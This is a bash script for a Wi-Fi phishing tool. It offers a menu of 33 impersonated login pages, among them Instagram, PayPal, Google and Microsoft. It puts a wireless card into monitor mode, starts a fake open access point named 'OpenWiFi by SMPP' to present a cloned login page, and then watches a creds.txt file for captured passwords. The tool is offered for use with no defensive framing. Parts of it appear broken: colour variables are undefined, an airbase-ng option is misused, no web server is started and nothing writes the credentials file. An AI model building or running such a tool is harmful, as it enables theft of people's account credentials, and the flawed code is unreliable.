#!/bin/bash

# Get the directory where the script is located
SCRIPT_DIR="$( cd "$( dirname "${BASH_SOURCE[0]}" )" &> /dev/null && pwd )"
SITES_DIR="$SCRIPT_DIR/sites"

# Function to clear the terminal
clear_terminal() {
    clear
}

# Function to display the big welcome message
big_welcome() {
    echo -e "${RED} __    __    ___  _        __   ___   ___ ___    ___      __ __   ____    __  __  _    ___  ____  ${NC}"
    echo -e "${RED}|  |__|  |  /  _]| |      /  ] /   \ |   |   |  /  _]    |  |  | /    |  /  ]|  |/ ]  /  _]|    \ ${NC}"
    echo -e "${RED}|  |  |  | /  [_ | |     /  / |     || _   _ | /  [_     |  |  ||  o  | /  / |  ' /  /  [_ |  D  )${NC}"
    echo -e "${RED}|  |  |  ||    _]| |___ /  /  |  O  ||  \_/  ||    _]    |  _  ||     |/  /  |    \ |    _]|    / ${NC}"
    echo -e "${RED}|  \`  '  ||   [_ |     /   \_ |     ||   |   ||   [_     |  |  ||  _  /   \_ |     ||   [_ |    \ ${NC}"
    echo -e "${RED} \      / |     ||     \     ||     ||   |   ||     |    |  |  ||  |  \     ||  .  ||     ||  .  \${NC}"
    echo -e "${RED}  \_/\_/  |_____||_____|\____| \___/ |___|___||_____|    |__|__||__|__|\____||__|\_||_____||__|\_${NC}"
}

# Function to display the menu for phishing options
menu() {
    echo -e "Select phishing server option:"
    echo "1. Instagram"
    echo "2. Facebook"
    echo "3. Snapchat"
    echo "4. Twitter"
    echo "5. Github"
    echo "6. Google"
    echo "7. Spotify"
    echo "8. Netflix"
    echo "9. PayPal"
    echo "10. Origin"
    echo "11. Steam"
    echo "12. Yahoo"
    echo "13. Linkedin"
    echo "14. Protonmail"
    echo "15. Wordpress"
    echo "16. Microsoft"
    echo "17. InstaFollowers"
    echo "18. Shopping"
    echo "19. Pinterest"
    echo "20. CryptoCurrency"
    echo "21. Verizon"
    echo "22. DropBox"
    echo "23. Adobe"
    echo "24. Shopify"
    echo "25. Messenger"
    echo "26. GitLab"
    echo "27. Twitch"
    echo "28. MySpace"
    echo "29. Badoo"
    echo "30. VK"
    echo "31. Yandex"
    echo "32. DevianArt"
    echo "33. Custom"
    read -p "Enter your choice: " choice
    case $choice in
        1) server="instagram"; captive_portal_phishing ;;
        2) server="facebook"; captive_portal_phishing ;;
        3) server="snapchat"; captive_portal_phishing ;;
        4) server="twitter"; captive_portal_phishing ;;
        5) server="github"; captive_portal_phishing ;;
        6) server="google"; captive_portal_phishing ;;
        7) server="spotify"; captive_portal_phishing ;;
        8) server="netflix"; captive_portal_phishing ;;
        9) server="paypal"; captive_portal_phishing ;;
        10) server="origin"; captive_portal_phishing ;;
        11) server="steam"; captive_portal_phishing ;;
        12) server="yahoo"; captive_portal_phishing ;;
        13) server="linkedin"; captive_portal_phishing ;;
        14) server="protonmail"; captive_portal_phishing ;;
        15) server="wordpress"; captive_portal_phishing ;;
        16) server="microsoft"; captive_portal_phishing ;;
        17) server="instafollowers"; captive_portal_phishing ;;
        18) server="shopping"; captive_portal_phishing ;;
        19) server="pinterest"; captive_portal_phishing ;;
        20) server="cryptocurrency"; captive_portal_phishing ;;
        21) server="verizon"; captive_portal_phishing ;;
        22) server="dropbox"; captive_portal_phishing ;;
        23) server="adobe"; captive_portal_phishing ;;
        24) server="shopify"; captive_portal_phishing ;;
        25) server="messenger"; captive_portal_phishing ;;
        26) server="gitlab"; captive_portal_phishing ;;
        27) server="twitch"; captive_portal_phishing ;;
        28) server="myspace"; captive_portal_phishing ;;
        29) server="badoo"; captive_portal_phishing ;;
        30) server="vk"; captive_portal_phishing ;;
        31) server="yandex"; captive_portal_phishing ;;
        32) server="devianart"; captive_portal_phishing ;;
        33) server="custom"; captive_portal_phishing ;;
        *) echo "Invalid choice. Please try again." ;;
    esac
}

# Function for captive portal phishing
captive_portal_phishing() {
    echo "Captive Portal Phishing selected."
    # Start captive portal phishing
    select_interface
}

# Function to select network interface and start monitor mode
select_interface() {
    echo "Enter the network interface you want to use (e.g., wlan0):"
    read -p "Interface: " interface
    if [ -z "$interface" ]; then
        echo "Interface not specified. Please try again."
        select_interface
    fi

    # Check if the interface exists
    if ! ifconfig "$interface" &>/dev/null; then
        echo "Interface $interface not found. Please try again."
        select_interface
    fi

    echo "Selected interface: $interface"
    start_monitor_mode "$interface"
}

# Function to start monitor mode on the specified interface
start_monitor_mode() {
    interface=$1
    echo "Putting $interface in monitor mode..."
    airmon-ng start "$interface"
    start_fake_ap "$interface"
}

# Function to start fake AP with captive portal
start_fake_ap() {
    interface=$1
    echo "Starting fake access point with captive portal on interface $interface..."
    # Get the selected server's login page
    server_login_page=$(ls ./sites/"$server"/login.*)

    # Start fake AP with the selected server's login page
    xterm -- airbase-ng -a AA:BB:CC:DD:EE:FF -e "OpenWiFi by SMPP" -c 6 -P "$server_login_page" "$interface" &
}

# Function to continuously display captured credentials
# Function to continuously display captured credentials
display_creds() {
    # Create creds.txt if it doesn't exist
    touch creds.txt

    echo "Waiting for credentials..."
    # Use tail -f on creds.txt
    tail -f creds.txt
}


# Main script starts here

# Clear the terminal
clear_terminal

# Display the big welcome message
big_welcome

# Call the menu function to start
menu

# Continuously display captured credentials
display_creds
